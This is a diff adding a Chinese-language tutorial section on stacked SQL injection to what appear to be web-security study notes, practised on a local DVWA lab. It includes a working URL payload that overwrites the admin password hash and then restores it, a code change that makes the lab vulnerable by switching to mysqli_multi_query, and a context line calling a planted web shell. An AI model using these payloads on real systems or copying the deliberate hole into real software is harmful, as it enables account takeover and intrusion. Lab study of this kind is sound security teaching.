@@ -1769,6 +1769,90 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### 堆叠注入 
 
+#### 堆叠注入定义 
+
+- 堆叠注入（Stacked Injections） 
+  - 一堆 SQL 语句(多条)一起执行。
+  - 在 MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。
+  - 这个叫做 stacked injection。
+- 测试SQL:
+  - select * from test;
+  - select * from test where id=1; select * from test where id=2;
+  - select * from test; update test set name='updated_test' where id=2;
+  - select * from test;
+- 在 ; 结束一个SQL语句后继续构造下一条语句，使多条语句顺序执行，这就是
+  堆叠注入。
+- 思考：union injection（联合注入）也是将两条语句合并在一起，两者之间有什么
+  区别么？ 
+  - union或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行任意的语句。
+  - 注意：场景少，但是威力大！ 
+- 并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题。
+- 真实环境中：
+  1. 通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的；
+  2. 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 
+
+
+
+#### PHP - MySQL相关API 
+
+- mysqli_multi_query 及 mysqli_use_result 
+
+![1617200228462](HackerMeWeb.assets/1617200228462.png)
+
+- API 测试
+
+  - 安装，并登录 DVWA 靶机 的 docker bash 交互式环境
+
+    - docker ps
+    - docker exec -it inspiring_agnesi bash
+
+  - 找到 SQL Injection 的服务文件
+
+    - cd /var/www/html/vulnerabilities/sqli/source/
+    - vim low.php
+
+  - 打开文件，注释掉mysqli_query，并新增mysqli_multi_query 
+
+    - ![1617200491634](HackerMeWeb.assets/1617200491634.png)
+
+    - ```php
+      mysqli_multi_query($GLOBALS["___mysqli_ston", $query]);
+      $result = mysqli_use_result($GLOBALS["___mysqli_ston"]);
+      ```
+
+  - 测试更新 API 后的功能
+
+    - 输入 1 ，submit，获得结果
+
+
+
+#### 堆叠注入实战
+
+- 使用报错注入获得的已知信息
+  - 包含数据库结构，数据表结构及用户账户信息
+- 在测试过程中，也许password解密难度很高，无法解密（很常见）
+  - 这时我们就可以使用堆叠注入，对admin账户的password进行更新。 
+  - 成功登录之后再进行复原。 
+  - 使用已知密码123456，通过 https://www.cmd5.com/hash.aspx?s=123456 获得 MD5密文，e10adc3949ba59abbe56e057f20f883e
+  - 基于堆叠注入，更改账号密码，http://127.0.0.1:81/vulnerabilities/sqli/?id=1'; update users set password='e10adc3949ba59abbe56e057f20f883e' where user_id=1; -- &Submit=Submit#
+  - 重新登录，用户名 admin，密码 123456，登录成功
+  - 将账号密码，更改回原来的状态，http://127.0.0.1:81/vulnerabilities/sqli/?id=1'; update users set password='5f4dcc3b5aa765d61d8327deb882cf99' where user_id=1; -- &Submit=Submit#
+  - 此时刚才登录的账号，并不会因为数据库中的密码不一样了，而发生退出现象
+- 在 容器内部的数据库查看用户表的信息数据
+  - 登录：mysql -u root -p
+  - show databases;
+  - use dvwa;
+  - show tables;
+  - select * from users;
+
+
+
+### OOB 注入
+
+
+
+
+
 
 
 
